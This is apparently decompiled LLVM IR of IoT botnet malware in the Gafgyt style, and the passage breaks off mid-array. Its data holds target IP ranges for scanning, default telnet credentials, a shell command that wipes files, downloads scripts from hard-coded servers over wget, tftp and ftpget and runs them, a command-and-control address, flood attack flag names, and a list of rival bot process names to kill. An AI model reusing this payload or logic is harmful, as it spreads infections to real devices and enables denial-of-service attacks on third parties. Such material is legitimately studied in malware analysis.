source_filename = "test"
target datalayout = "e-p:32:32:32-f80:32:32"

%_TYPEDEF_sigset_t = type { [1 x i32] }
%sockaddr = type { i32, [14 x i8] }
%timespec = type { i32, i32 }
%sigcontext = type { i32 }
%sigaction = type { void (i32)*, i32, void ()*, %_TYPEDEF_sigset_t }
%pollfd = type { i32, i16, i16 }

@r0 = internal unnamed_addr global i32 0
@r1 = internal unnamed_addr global i32 0
@r2 = internal unnamed_addr global i32 0
@r3 = internal unnamed_addr global i32 0
@r4 = internal unnamed_addr global i32 0
@r5 = internal unnamed_addr global i32 0
@r6 = internal unnamed_addr global i32 0
@r7 = internal unnamed_addr global i32 0
@r8 = internal unnamed_addr global i32 0
@sb = internal unnamed_addr global i32 0
@sl = internal unnamed_addr global i32 0
@fp = internal unnamed_addr global i32 0
@ip = internal unnamed_addr global i32 0
@sp = internal unnamed_addr global i32 0
@lr = internal unnamed_addr global i32 0
@cpsr_z = internal unnamed_addr global i1 false
@0 = external global i32
@global_var_80a0.3 = constant i32 -352321502
@global_var_2c310.7 = global i32 0
@global_var_2c320.8 = global i32* @global_var_2c310.7
@global_var_2c8f0.15 = global i32 0
@global_var_2c314.18 = global i32 0
@global_var_10be0.22 = constant i32 -509558771
@global_var_2c924.25 = global i32 0
@global_var_2c928.26 = local_unnamed_addr global i32 0
@global_var_2c92c.27 = local_unnamed_addr global i32 0
@global_var_2c584.30 = local_unnamed_addr global i32 4095
@global_var_2c580.33 = global i32 362436
@global_var_1a2d8.35 = constant [7 x i8] c"(null)\00"
@global_var_30924.37 = local_unnamed_addr global i32 0
@global_var_1a2e0.39 = constant [8 x i8] c"/bin/sh\00"
@global_var_19ed8.41 = constant [3 x i8] c"sh\00"
@global_var_1a2e8.43 = constant [3 x i8] c"-c\00"
@global_var_1a2ec.46 = constant i32 -1
@global_var_1a6ec.48 = constant [14 x i8] c"/proc/cpuinfo\00"
@global_var_1a6fc.50 = constant [9 x i8] c"BOGOMIPS\00"
@global_var_2c908.54 = global i32 0
@global_var_1a708.56 = constant [5 x i8] c"PING\00"
@global_var_1a2c8.58 = constant [8 x i8] c"busybox\00"
@global_var_1a2d0.59 = constant i32 36
@global_var_1a2d4.60 = constant i32 35
@global_var_2c504.61 = global [3 x i8*] [i8* getelementptr inbounds ([8 x i8], [8 x i8]* @global_var_1a2c8.58, i32 0, i32 0), i8* bitcast (i32* @global_var_1a2d0.59 to i8*), i8* bitcast (i32* @global_var_1a2d4.60 to i8*)]
@global_var_1a290.63 = constant [7 x i8] c"nvalid\00"
@global_var_1a298.64 = constant [6 x i8] c"ailed\00"
@global_var_1a2a0.65 = constant [9 x i8] c"ncorrect\00"
@global_var_1a2ac.66 = constant [6 x i8] c"enied\00"
@global_var_1a2b4.67 = constant [5 x i8] c"rror\00"
@global_var_1a2bc.68 = constant [7 x i8] c"oodbye\00"
@global_var_1a2c4.69 = constant [4 x i8] c"bad\00"
@global_var_2c4e4.70 = global [7 x i8*] [i8* getelementptr inbounds ([7 x i8], [7 x i8]* @global_var_1a290.63, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @global_var_1a298.64, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @global_var_1a2a0.65, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @global_var_1a2ac.66, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_1a2b4.67, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @global_var_1a2bc.68, i32 0, i32 0), i8* getelementptr inbounds ([4 x i8], [4 x i8]* @global_var_1a2c4.69, i32 0, i32 0)]
@global_var_2c910.72 = global i32 0
@global_var_2c914.73 = local_unnamed_addr global i32 0
@global_var_32b90.75 = global i32 0
@global_var_1a710.77 = constant [6 x i8] c":>%$#\00"
@global_var_1a718.85 = constant [13 x i8] c"43.252.%d.%d\00"
@global_var_1a728.87 = constant [13 x i8] c"43.239.%d.%d\00"
@global_var_1a738.89 = constant [11 x i8] c"85.3.%d.%d\00"
@global_var_1a744.91 = constant [13 x i8] c"37.158.%d.%d\00"
@global_var_1a754.93 = constant [11 x i8] c"95.9.%d.%d\00"
@global_var_1a760.95 = constant [13 x i8] c"41.252.%d.%d\00"
@global_var_1a770.97 = constant [12 x i8] c"58.71.%d.%d\00"
@global_var_1a77c.99 = constant [13 x i8] c"104.55.%d.%d\00"
@global_var_1a78c.101 = constant [13 x i8] c"78.186.%d.%d\00"
@global_var_1a79c.103 = constant [13 x i8] c"78.189.%d.%d\00"
@global_var_1a7ac.105 = constant [13 x i8] c"77.209.%d.%d\00"
@global_var_1a7bc.107 = constant [11 x i8] c"88.5.%d.%d\00"
@global_var_1a7c8.109 = constant [13 x i8] c"103.20.%d.%d\00"
@global_var_1a7d8.111 = constant [13 x i8] c"103.47.%d.%d\00"
@global_var_1a7e8.113 = constant [13 x i8] c"103.57.%d.%d\00"
@global_var_1a7f8.115 = constant [13 x i8] c"45.117.%d.%d\00"
@global_var_1a808.117 = constant [13 x i8] c"101.51.%d.%d\00"
@global_var_1a818.119 = constant [13 x i8] c"137.59.%d.%d\00"
@global_var_1a828.121 = constant [11 x i8] c"1.56.%d.%d\00"
@global_var_1a834.123 = constant [12 x i8] c"1.188.%d.%d\00"
@global_var_1a840.125 = constant [13 x i8] c"14.204.%d.%d\00"
@global_var_1a850.127 = constant [11 x i8] c"27.0.%d.%d\00"
@global_var_1a85c.129 = constant [11 x i8] c"27.8.%d.%d\00"
@global_var_1a868.131 = constant [12 x i8] c"27.50.%d.%d\00"
@global_var_1a874.133 = constant [12 x i8] c"27.54.%d.%d\00"
@global_var_1a880.135 = constant [12 x i8] c"27.98.%d.%d\00"
@global_var_1a88c.137 = constant [13 x i8] c"27.112.%d.%d\00"
@global_var_1a89c.139 = constant [13 x i8] c"27.192.%d.%d\00"
@global_var_1a8ac.141 = constant [12 x i8] c"36.32.%d.%d\00"
@global_var_1a8b8.143 = constant [13 x i8] c"36.248.%d.%d\00"
@global_var_1a8c8.145 = constant [12 x i8] c"39.64.%d.%d\00"
@global_var_1a8d4.147 = constant [11 x i8] c"42.4.%d.%d\00"
@global_var_1a8e0.149 = constant [12 x i8] c"42.48.%d.%d\00"
@global_var_1a8ec.151 = constant [12 x i8] c"42.52.%d.%d\00"
@global_var_1a8f8.153 = constant [12 x i8] c"42.56.%d.%d\00"
@global_var_1a904.155 = constant [12 x i8] c"42.63.%d.%d\00"
@global_var_1a910.157 = constant [12 x i8] c"42.84.%d.%d\00"
@global_var_1a91c.159 = constant [13 x i8] c"42.176.%d.%d\00"
@global_var_1a92c.161 = constant [13 x i8] c"42.224.%d.%d\00"
@global_var_1a93c.163 = constant [11 x i8] c"60.0.%d.%d\00"
@global_var_1a948.165 = constant [12 x i8] c"60.16.%d.%d\00"
@global_var_1a954.167 = constant [13 x i8] c"163.53.%d.%d\00"
@global_var_1a964.169 = constant [12 x i8] c"62.30.%d.%d\00"
@global_var_1a970.171 = constant [13 x i8] c"62.252.%d.%d\00"
@global_var_1a980.173 = constant [13 x i8] c"62.254.%d.%d\00"
@global_var_1a990.175 = constant [13 x i8] c"62.255.%d.%d\00"
@global_var_1a9a0.177 = constant [12 x i8] c"77.96.%d.%d\00"
@global_var_1a9ac.179 = constant [12 x i8] c"77.97.%d.%d\00"
@global_var_1a9b8.181 = constant [12 x i8] c"77.98.%d.%d\00"
@global_var_1a9c4.183 = constant [13 x i8] c"77.100.%d.%d\00"
@global_var_1a9d4.185 = constant [13 x i8] c"77.102.%d.%d\00"
@global_var_1a9e4.187 = constant [14 x i8] c"113.191.%d.%d\00"
@global_var_1a9f4.189 = constant [13 x i8] c"81.100.%d.%d\00"
@global_var_1aa04.191 = constant [14 x i8] c"113.188.%d.%d\00"
@global_var_1aa14.193 = constant [14 x i8] c"113.189.%d.%d\00"
@global_var_1aa24.195 = constant [13 x i8] c"94.174.%d.%d\00"
@global_var_1aa34.197 = constant [13 x i8] c"14.160.%d.%d\00"
@global_var_1aa44.199 = constant [13 x i8] c"14.161.%d.%d\00"
@global_var_1aa54.201 = constant [13 x i8] c"14.162.%d.%d\00"
@global_var_1aa64.203 = constant [13 x i8] c"14.163.%d.%d\00"
@global_var_1aa74.205 = constant [13 x i8] c"14.164.%d.%d\00"
@global_var_1aa84.207 = constant [13 x i8] c"14.165.%d.%d\00"
@global_var_1aa94.209 = constant [13 x i8] c"14.166.%d.%d\00"
@global_var_1aaa4.211 = constant [13 x i8] c"14.167.%d.%d\00"
@global_var_1aab4.213 = constant [13 x i8] c"14.168.%d.%d\00"
@global_var_1aac4.215 = constant [13 x i8] c"14.169.%d.%d\00"
@global_var_1aad4.217 = constant [13 x i8] c"14.170.%d.%d\00"
@global_var_1aae4.219 = constant [13 x i8] c"14.171.%d.%d\00"
@global_var_1aaf4.221 = constant [13 x i8] c"14.172.%d.%d\00"
@global_var_1ab04.223 = constant [13 x i8] c"14.173.%d.%d\00"
@global_var_1ab14.225 = constant [13 x i8] c"14.174.%d.%d\00"
@global_var_1ab24.227 = constant [13 x i8] c"14.175.%d.%d\00"
@global_var_1ab34.229 = constant [13 x i8] c"14.176.%d.%d\00"
@global_var_1ab44.232 = constant [13 x i8] c"14.177.%d.%d\00"
@global_var_1ab54.234 = constant [13 x i8] c"14.178.%d.%d\00"
@global_var_1ab64.236 = constant [13 x i8] c"14.179.%d.%d\00"
@global_var_1ab74.238 = constant [13 x i8] c"14.180.%d.%d\00"
@global_var_1ab84.240 = constant [13 x i8] c"14.181.%d.%d\00"
@global_var_1ab94.242 = constant [13 x i8] c"14.182.%d.%d\00"
@global_var_1aba4.244 = constant [13 x i8] c"14.183.%d.%d\00"
@global_var_1abb4.246 = constant [13 x i8] c"14.184.%d.%d\00"
@global_var_1abc4.248 = constant [13 x i8] c"14.185.%d.%d\00"
@global_var_1abd4.250 = constant [13 x i8] c"14.186.%d.%d\00"
@global_var_1abe4.252 = constant [13 x i8] c"14.187.%d.%d\00"
@global_var_1abf4.254 = constant [13 x i8] c"14.188.%d.%d\00"
@global_var_1ac04.256 = constant [13 x i8] c"14.189.%d.%d\00"
@global_var_1ac14.258 = constant [13 x i8] c"14.190.%d.%d\00"
@global_var_1ac24.260 = constant [13 x i8] c"14.191.%d.%d\00"
@global_var_1ac34.262 = constant [13 x i8] c"45.121.%d.%d\00"
@global_var_1ac44.264 = constant [13 x i8] c"45.120.%d.%d\00"
@global_var_1ac54.266 = constant [13 x i8] c"45.115.%d.%d\00"
@global_var_1ac64.269 = constant [13 x i8] c"43.230.%d.%d\00"
@global_var_1ac74.271 = constant [13 x i8] c"43.240.%d.%d\00"
@global_var_1ac84.273 = constant [13 x i8] c"43.245.%d.%d\00"
@global_var_1ac94.275 = constant [13 x i8] c"41.174.%d.%d\00"
@global_var_1aca4.277 = constant [13 x i8] c"49.118.%d.%d\00"
@global_var_1acb4.279 = constant [13 x i8] c"78.188.%d.%d\00"
@global_var_1acc4.281 = constant [13 x i8] c"45.127.%d.%d\00"
@global_var_1acd4.283 = constant [13 x i8] c"103.30.%d.%d\00"
@global_var_1ace4.285 = constant [12 x i8] c"14.33.%d.%d\00"
@global_var_1acf0.287 = constant [13 x i8] c"123.16.%d.%d\00"
@global_var_1ad00.289 = constant [13 x i8] c"202.44.%d.%d\00"
@global_var_1ad10.291 = constant [13 x i8] c"116.93.%d.%d\00"
@global_var_1ad20.293 = constant [12 x i8] c"91.83.%d.%d\00"
@global_var_1ad2c.295 = constant [13 x i8] c"41.253.%d.%d\00"
@global_var_1ad3c.297 = constant [14 x i8] c"117.173.%d.%d\00"
@global_var_1ad4c.299 = constant [14 x i8] c"113.190.%d.%d\00"
@global_var_1ad5c.301 = constant [13 x i8] c"146.88.%d.%d\00"
@global_var_1ad6c.303 = constant [14 x i8] c"112.196.%d.%d\00"
@global_var_1ad7c.305 = constant [14 x i8] c"113.178.%d.%d\00"
@global_var_1ad8c.307 = constant [13 x i8] c"112.45.%d.%d\00"
@global_var_1ad9c.309 = constant [14 x i8] c"183.223.%d.%d\00"
@global_var_2c540.311 = global i32 110
@global_var_1adac.314 = constant [12 x i8] c"%d.%d.%d.%d\00"
@global_var_32b84.316 = global i32 0
@global_var_1a214.318 = constant [15 x i8] c"/dev/netslink/\00"
@global_var_1a224.319 = constant [6 x i8] c"/tmp/\00"
@global_var_1a22c.320 = constant [6 x i8] c"/var/\00"
@global_var_1a234.321 = constant [6 x i8] c"/dev/\00"
@global_var_1a23c.322 = constant [10 x i8] c"/var/run/\00"
@global_var_1a248.323 = constant [10 x i8] c"/dev/shm/\00"
@global_var_1a254.324 = constant [6 x i8] c"/mnt/\00"
@global_var_1a25c.325 = constant [7 x i8] c"/boot/\00"
@global_var_1a264.326 = constant [6 x i8] c"/usr/\00"
@global_var_1a26c.327 = constant [6 x i8] c"/opt/\00"
@global_var_2c4a4.328 = global [10 x i8*] [i8* getelementptr inbounds ([15 x i8], [15 x i8]* @global_var_1a214.318, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @global_var_1a224.319, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @global_var_1a22c.320, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @global_var_1a234.321, i32 0, i32 0), i8* getelementptr inbounds ([10 x i8], [10 x i8]* @global_var_1a23c.322, i32 0, i32 0), i8* getelementptr inbounds ([10 x i8], [10 x i8]* @global_var_1a248.323, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @global_var_1a254.324, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @global_var_1a25c.325, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @global_var_1a264.326, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @global_var_1a26c.327, i32 0, i32 0)]
@global_var_2c4d0 = external global i32
@global_var_1a200.335 = constant [5 x i8] c"root\00"
@global_var_1a208.336 = constant [7 x i8] c"telnet\00"
@global_var_1a210.337 = constant i32 0
@global_var_2c48c.338 = global [6 x i8*] [i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_1a200.335, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_1a200.335, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @global_var_1a208.336, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_1a200.335, i32 0, i32 0), i8* bitcast (i32* @global_var_1a210.337 to i8*), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @global_var_1a208.336, i32 0, i32 0)]
@global_var_1adb8.340 = constant [3 x i8] c"\0D\0A\00"
@global_var_2c498.342 = global [3 x i8*] [i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_1a200.335, i32 0, i32 0), i8* bitcast (i32* @global_var_1a210.337 to i8*), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @global_var_1a208.336, i32 0, i32 0)]
@global_var_2c514.344 = global [10 x i8*] [i8* getelementptr inbounds ([7 x i8], [7 x i8]* @global_var_1a290.63, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @global_var_1a298.64, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @global_var_1a2a0.65, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @global_var_1a2ac.66, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_1a2b4.67, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @global_var_1a2bc.68, i32 0, i32 0), i8* getelementptr inbounds ([4 x i8], [4 x i8]* @global_var_1a2c4.69, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @global_var_1a2c8.58, i32 0, i32 0), i8* bitcast (i32* @global_var_1a2d0.59 to i8*), i8* bitcast (i32* @global_var_1a2d4.60 to i8*)]
@global_var_1adbc.347 = constant [23 x i8] c"LOGIN FOUND - %s:%s:%s\00"
@global_var_1add4.349 = constant [5 x i8] c"sh\0D\0A\00"
@global_var_1addc.351 = constant [8 x i8] c"shell\0D\0A\00"
@global_var_1a004.353 = constant [507 x i8] c"cd /tmp || cd /var/system || cd /mnt || cd /lib;rm -f /tmp/* || /var/run/* || /var/system/* || /mnt/* || /lib/*;cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://45.32.213.61/bins.sh; chmod 777 bins.sh; sh bins.sh; tftp 207.148.12.91 -c get tftp1.sh; chmod 777 tftp1.sh; sh tftp1.sh; tftp -r tftp2.sh -g 207.148.12.91; chmod 777 tftp2.sh; sh tftp2.sh; ftpget -v -u anonymous -p anonymous -P 21 207.148.12.91 ftp1.sh ftp1.sh; sh ftp1.sh; rm -rf bins.sh tftp1.sh tftp2.sh ftp1.sh; rm -rf *\0D\0A\00"
@global_var_2c488.354 = local_unnamed_addr global [507 x i8]* @global_var_1a004.353
@global_var_1ade4.356 = constant [6 x i8] c"arfgG\00"
@global_var_1adec.357 = constant [9 x i8] c"HBiug655\00"
@global_var_1adf8.358 = constant [13 x i8] c"KJYDFyljf754\00"
@global_var_1ae08.359 = constant [20 x i8] c"LIKUGilkut769458905\00"
@global_var_1ae1c.360 = constant [17 x i8] c"JHFDSkgfc5747694\00"
@global_var_1ae30.361 = constant [12 x i8] c"GJjyur67458\00"
@global_var_1ae3c.362 = constant [12 x i8] c"RYSDk747586\00"
@global_var_1ae48.363 = constant [12 x i8] c"HKJGi5r8675\00"
@global_var_1ae54.364 = constant [10 x i8] c"KHGK7985i\00"
@global_var_1ae60.365 = constant [11 x i8] c"yuituiILYF\00"
@global_var_1ae6c.366 = constant [14 x i8] c"GKJDghfcjkgd4\00"
@global_var_1ae7c.367 = constant [12 x i8] c"uygtfgtrevf\00"
@global_var_1ae88.368 = constant [13 x i8] c"tyeuhygbtfvg\00"
@global_var_1ae98.369 = constant [9 x i8] c"ewqdcftr\00"
@global_var_1aea4.370 = constant [16 x i8] c"trbazetghhnbrty\00"
@global_var_1aeb4.371 = constant [11 x i8] c"tbhrwsehbg\00"
@global_var_1aec0.372 = constant [12 x i8] c"twehgbferhb\00"
@global_var_1aecc.373 = constant [12 x i8] c"etrbhhgetrb\00"
@global_var_1aed8.374 = constant [14 x i8] c"edfverthbyrtb\00"
@global_var_1aee8.375 = constant [14 x i8] c"kmiujmnhnhfgn\00"
@global_var_1aef8.376 = constant [14 x i8] c"zcdbvgdfsbgfd\00"
@global_var_1af08.377 = constant [10 x i8] c"gdfbtsdgb\00"
@global_var_1af14.378 = constant [14 x i8] c"ghdugffytsdyt\00"
@global_var_1af24.379 = constant [14 x i8] c"tgerthgwtrwry\00"
@global_var_1af34.380 = constant [12 x i8] c"yteytietyue\00"
@global_var_1af40.381 = constant [9 x i8] c"qsortEQS\00"
@global_var_1af4c.382 = constant [16 x i8] c"8969876hjkghblk\00"
@global_var_1af5c.383 = constant [4 x i8] c"std\00"
@global_var_1af60.384 = constant [4 x i8] c"dts\00"
@global_var_1af64.385 = constant [4 x i8] c"lsk\00"
@global_var_1af68.386 = constant [4 x i8] c"kek\00"
@global_var_1af6c.387 = constant [6 x i8] c"smack\00"
@global_var_1af74.388 = constant [4 x i8] c"ily\00"
@global_var_1af78.389 = constant [4 x i8] c"tyf\00"
@global_var_1af7c.390 = constant [4 x i8] c"pos\00"
@global_var_1af80.391 = constant [6 x i8] c"cunts\00"
@global_var_1af88.392 = constant [36 x i8*] [i8* getelementptr inbounds ([6 x i8], [6 x i8]* @global_var_1ade4.356, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @global_var_1adec.357, i32 0, i32 0), i8* getelementptr inbounds ([13 x i8], [13 x i8]* @global_var_1adf8.358, i32 0, i32 0), i8* getelementptr inbounds ([20 x i8], [20 x i8]* @global_var_1ae08.359, i32 0, i32 0), i8* getelementptr inbounds ([17 x i8], [17 x i8]* @global_var_1ae1c.360, i32 0, i32 0), i8* getelementptr inbounds ([12 x i8], [12 x i8]* @global_var_1ae30.361, i32 0, i32 0), i8* getelementptr inbounds ([12 x i8], [12 x i8]* @global_var_1ae3c.362, i32 0, i32 0), i8* getelementptr inbounds ([12 x i8], [12 x i8]* @global_var_1ae48.363, i32 0, i32 0), i8* getelementptr inbounds ([10 x i8], [10 x i8]* @global_var_1ae54.364, i32 0, i32 0), i8* getelementptr inbounds ([11 x i8], [11 x i8]* @global_var_1ae60.365, i32 0, i32 0), i8* getelementptr inbounds ([14 x i8], [14 x i8]* @global_var_1ae6c.366, i32 0, i32 0), i8* getelementptr inbounds ([12 x i8], [12 x i8]* @global_var_1ae7c.367, i32 0, i32 0), i8* getelementptr inbounds ([13 x i8], [13 x i8]* @global_var_1ae88.368, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @global_var_1ae98.369, i32 0, i32 0), i8* getelementptr inbounds ([16 x i8], [16 x i8]* @global_var_1aea4.370, i32 0, i32 0), i8* getelementptr inbounds ([11 x i8], [11 x i8]* @global_var_1aeb4.371, i32 0, i32 0), i8* getelementptr inbounds ([12 x i8], [12 x i8]* @global_var_1aec0.372, i32 0, i32 0), i8* getelementptr inbounds ([12 x i8], [12 x i8]* @global_var_1aecc.373, i32 0, i32 0), i8* getelementptr inbounds ([14 x i8], [14 x i8]* @global_var_1aed8.374, i32 0, i32 0), i8* getelementptr inbounds ([14 x i8], [14 x i8]* @global_var_1aee8.375, i32 0, i32 0), i8* getelementptr inbounds ([14 x i8], [14 x i8]* @global_var_1aef8.376, i32 0, i32 0), i8* getelementptr inbounds ([10 x i8], [10 x i8]* @global_var_1af08.377, i32 0, i32 0), i8* getelementptr inbounds ([14 x i8], [14 x i8]* @global_var_1af14.378, i32 0, i32 0), i8* getelementptr inbounds ([14 x i8], [14 x i8]* @global_var_1af24.379, i32 0, i32 0), i8* getelementptr inbounds ([12 x i8], [12 x i8]* @global_var_1af34.380, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @global_var_1af40.381, i32 0, i32 0), i8* getelementptr inbounds ([16 x i8], [16 x i8]* @global_var_1af4c.382, i32 0, i32 0), i8* getelementptr inbounds ([4 x i8], [4 x i8]* @global_var_1af5c.383, i32 0, i32 0), i8* getelementptr inbounds ([4 x i8], [4 x i8]* @global_var_1af60.384, i32 0, i32 0), i8* getelementptr inbounds ([4 x i8], [4 x i8]* @global_var_1af64.385, i32 0, i32 0), i8* getelementptr inbounds ([4 x i8], [4 x i8]* @global_var_1af68.386, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @global_var_1af6c.387, i32 0, i32 0), i8* getelementptr inbounds ([4 x i8], [4 x i8]* @global_var_1af74.388, i32 0, i32 0), i8* getelementptr inbounds ([4 x i8], [4 x i8]* @global_var_1af78.389, i32 0, i32 0), i8* getelementptr inbounds ([4 x i8], [4 x i8]* @global_var_1af7c.390, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @global_var_1af80.391, i32 0, i32 0)]
@global_var_1b018.395 = constant [27 x i8] c"Failed opening raw socket.\00"
@global_var_1b034.397 = constant [33 x i8] c"Failed setting raw headers mode.\00"
@global_var_1b058.402 = constant [4 x i8] c"all\00"
@global_var_1b05c.404 = constant i32 44
@global_var_1b060.406 = constant [4 x i8] c"syn\00"
@global_var_1b064.408 = constant [4 x i8] c"rst\00"
@global_var_1b068.410 = constant [4 x i8] c"fin\00"
@global_var_1b06c.412 = constant [4 x i8] c"ack\00"
@global_var_1b070.414 = constant [4 x i8] c"psh\00"
@global_var_1b074.416 = constant [18 x i8] c"Invalid flag \22%s\22\00"
@global_var_19d98.422 = constant [5 x i8] c"mips\00"
@global_var_19da0.423 = constant [7 x i8] c"mipsel\00"
@global_var_19da8.424 = constant [4 x i8] c"sh4\00"
@global_var_19dac.425 = constant [4 x i8] c"x86\00"
@global_var_19db0.426 = constant [5 x i8] c"i686\00"
@global_var_19db8.427 = constant [4 x i8] c"ppc\00"
@global_var_19dbc.428 = constant [5 x i8] c"i586\00"
@global_var_19dc4.429 = constant [8 x i8] c"jackmy*\00"
@global_var_19dcc.430 = constant [8 x i8] c"hackmy*\00"
@global_var_19dd4.431 = constant [5 x i8] c"arm*\00"
@global_var_19ddc.432 = constant [3 x i8] c"b1\00"
@global_var_19de0.433 = constant [3 x i8] c"b2\00"
@global_var_19de4.434 = constant [3 x i8] c"b3\00"
@global_var_19de8.435 = constant [3 x i8] c"b4\00"
@global_var_19dec.436 = constant [3 x i8] c"b5\00"
@global_var_19df0.437 = constant [3 x i8] c"b6\00"
@global_var_19df4.438 = constant [3 x i8] c"b7\00"
@global_var_19df8.439 = constant [3 x i8] c"b8\00"
@global_var_19dfc.440 = constant [3 x i8] c"b9\00"
@global_var_19e00.441 = constant [17 x i8] c"busyboxterrorist\00"
@global_var_19e14.442 = constant [9 x i8] c"DFhxdhdf\00"
@global_var_19e20.443 = constant [10 x i8] c"dvrHelper\00"
@global_var_19e2c.444 = constant [8 x i8] c"FDFDHFC\00"
@global_var_19e34.445 = constant [5 x i8] c"FEUB\00"
@global_var_19e3c.446 = constant [9 x i8] c"FTUdftui\00"
@global_var_19e48.447 = constant [9 x i8] c"GHfjfgvj\00"
@global_var_19e54.448 = constant [6 x i8] c"jhUOH\00"
@global_var_19e5c.449 = constant [9 x i8] c"JIPJIPJj\00"
@global_var_19e68.450 = constant [10 x i8] c"JIPJuipjh\00"
@global_var_19e74.451 = constant [10 x i8] c"kmyx86_64\00"
@global_var_19e80.452 = constant [10 x i8] c"lolmipsel\00"
@global_var_19e8c.453 = constant [8 x i8] c"RYrydry\00"
@global_var_19e94.454 = constant [5 x i8] c"tel*\00"
@global_var_19e9c.455 = constant [9 x i8] c"TwoFace*\00"
@global_var_19ea8.456 = constant [9 x i8] c"UYyuyioy\00"
@global_var_19eb4.457 = constant [5 x i8] c"wget\00"
@global_var_19ebc.458 = constant [7 x i8] c"x86_64\00"
@global_var_19ec4.459 = constant [9 x i8] c"XDzdfxzf\00"
@global_var_19ed0.460 = constant [5 x i8] c"xxb*\00"
@global_var_19edc.461 = constant i32 49
@global_var_19ee0.462 = constant i32 50
@global_var_19ee4.463 = constant i32 51
@global_var_19ee8.464 = constant i32 52
@global_var_19eec.465 = constant i32 53
@global_var_19ef0.466 = constant i32 54
@global_var_19ef4.467 = constant i32 55
@global_var_19ef8.468 = constant i32 56
@global_var_19efc.469 = constant i32 57
@global_var_19f00.470 = constant [3 x i8] c"10\00"
@global_var_19f04.471 = constant [3 x i8] c"11\00"
@global_var_19f08.472 = constant [3 x i8] c"12\00"
@global_var_19f0c.473 = constant [3 x i8] c"13\00"
@global_var_19f10.474 = constant [3 x i8] c"14\00"
@global_var_19f14.475 = constant [3 x i8] c"15\00"
@global_var_19f18.476 = constant [3 x i8] c"16\00"
@global_var_19f1c.477 = constant [3 x i8] c"17\00"
@global_var_19f20.478 = constant [3 x i8] c"18\00"
@global_var_19f24.479 = constant [3 x i8] c"19\00"
@global_var_19f28.480 = constant [3 x i8] c"20\00"
@global_var_19f2c.481 = constant [6 x i8] c"hackz\00"
@global_var_19f34.482 = constant [5 x i8] c"bin*\00"
@global_var_19f3c.483 = constant [5 x i8] c"gtop\00"
@global_var_19f44.484 = constant [5 x i8] c"ftp*\00"
@global_var_19f4c.485 = constant [6 x i8] c"tftp*\00"
@global_var_19f54.486 = constant [7 x i8] c"botnet\00"
@global_var_19f5c.487 = constant [8 x i8] c"swatnet\00"
@global_var_19f64.488 = constant [8 x i8] c"ballpit\00"
@global_var_19f6c.489 = constant [8 x i8] c"fucknet\00"
@global_var_19f74.490 = constant [9 x i8] c"cracknet\00"
@global_var_19f80.491 = constant [8 x i8] c"weednet\00"
@global_var_19f88.492 = constant [7 x i8] c"gaynet\00"
@global_var_19f90.493 = constant [9 x i8] c"queernet\00"
@global_var_19f9c.494 = constant [8 x i8] c"ballnet\00"
@global_var_19fa4.495 = constant [5 x i8] c"unet\00"
@global_var_19fac.496 = constant [7 x i8] c"yougay\00"
@global_var_19fb4.497 = constant [7 x i8] c"sttftp\00"
@global_var_19fbc.498 = constant [7 x i8] c"sstftp\00"
@global_var_19fc4.499 = constant [7 x i8] c"sbtftp\00"
@global_var_19fcc.500 = constant [6 x i8] c"btftp\00"
@global_var_19fd4.501 = constant [9 x i8] c"y0u1sg3y\00"
@global_var_19fe0.502 = constant [6 x i8] c"bruv*\00"
@global_var_19fe8.503 = constant [5 x i8] c"IoT*\00"
@global_var_19ff0.504 = constant [18 x i8] c"185.158.113.30:77\00"
@global_var_2c328.505 = global [87 x i8*] [i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_19d98.422, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @global_var_19da0.423, i32 0, i32 0), i8* getelementptr inbounds ([4 x i8], [4 x i8]* @global_var_19da8.424, i32 0, i32 0), i8* getelementptr inbounds ([4 x i8], [4 x i8]* @global_var_19dac.425, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_19db0.426, i32 0, i32 0), i8* getelementptr inbounds ([4 x i8], [4 x i8]* @global_var_19db8.427, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_19dbc.428, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_19dbc.428, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @global_var_19dc4.429, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @global_var_19dcc.430, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* 